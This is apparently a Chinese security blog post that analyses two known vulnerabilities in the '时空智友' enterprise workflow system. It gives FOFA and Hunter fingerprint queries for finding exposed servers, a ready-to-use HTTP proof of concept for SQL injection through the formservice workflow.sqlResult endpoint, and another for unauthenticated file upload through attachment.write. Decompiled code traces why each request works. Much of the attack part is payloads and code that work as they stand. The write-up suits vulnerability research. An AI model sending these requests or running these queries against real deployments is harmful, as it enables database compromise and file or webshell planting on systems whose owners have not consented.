



## 时空智友

```
body="企业流程化管控系统" && body="密码(Password):"
```

    fofa-query: icon_hash="-1700598274"
    hunter-query: web.icon=="2464cbce5dd2681dd4fb62d055520d78"

一个月前看的了，今天来写一哈

网上历史漏洞如下

| workflow.sqlResult sql注入 |
| -------------------------- |
| attachment.write 文件上传  |



### workflow.sqlResult sql注入

网上poc如下

```
POST /formservice?service=workflow.sqlResult HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
         
{"params":{"a":"11"},"sql":"select @@version"}
```

爆出来的漏洞大部分都是通过formservice反射调用存在漏洞的service的方法，formservice大致代码如下

```
protected final void service(HttpServletRequest var1, HttpServletResponse var2) {
        var7 = ((Class)(var6 = getService(var1, var1.getParameter("service")))[0]).newInstance();
            public static Object[] getService(HttpServletRequest var0, String var1) {
            var9 = Class.forName((String)pluginMap.get(var3));
            var7 = var9.getMethods();
```

而这个service必须是formservice中的init中获取plugins.xml中读取到的service

```
pluginMap = Configuration.getPlugins("form-service", "service");
```

```
getPlugins("/plugins.xml",
```

而这个sql注入是workflow.sqlResult，所以找到对应文件

```
		<service name="workflow" class="com.xxx.xxxx.ServiceImpl"/>
```

直接跟进

```
    public String sqlResult(HttpServletRequest var1, HttpServletResponse var2, JSONObject var3) {
        String var4 = var3.getString("sql");
        Map var5 = FormUtil.jsonObjectToMap(var3.getJSONObject("params"));
        return DBUtil.getFieldValue(var4, var5);
    }
```



### attachment.write 文件上传

网上poc如下

```
        POST /formservice?service=attachment.write&isattach=false&filename=cnvd.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip

        {{randstr}}
        
        GET /form/temp/{{name}} HTTP/1.1
        Host: {{Hostname}}
```



attachment.write也是通过formservice来实现文件上传，直接进入文件

```
<service name="attachment" class="com.xxxx.xxxx.services.xxxxx"/>
```



代码大致如下

```
public String write(HttpServletRequest request, HttpServletResponse response, InputStream is) throws Exception {
    String filename = GeneralUtility.getParameter(request, "filename");
    boolean isattach = GeneralUtility.getParameter(request, "isattach", "true").equals("true");
    String attachFileName = "";
    if (isattach) {
    xxxxxx;
    } else {
        String rootpath = Configuration.getRealPath(isattach ? "/attachments" : "/form");
        File tmpPath = new File(rootpath + "/temp");
        File file = new File(tmpPath, attachFileName);
        FileOutputStream fos = new FileOutputStream(file);
        FileUtility.in2out(is, fos);
    }

    return attachFileName;
}
```

isattach默认为true，poc中传入false进入到else部分，文件目录由form和temp拼接

文件传入数据由FileUtility.in2out(is, fos);处理



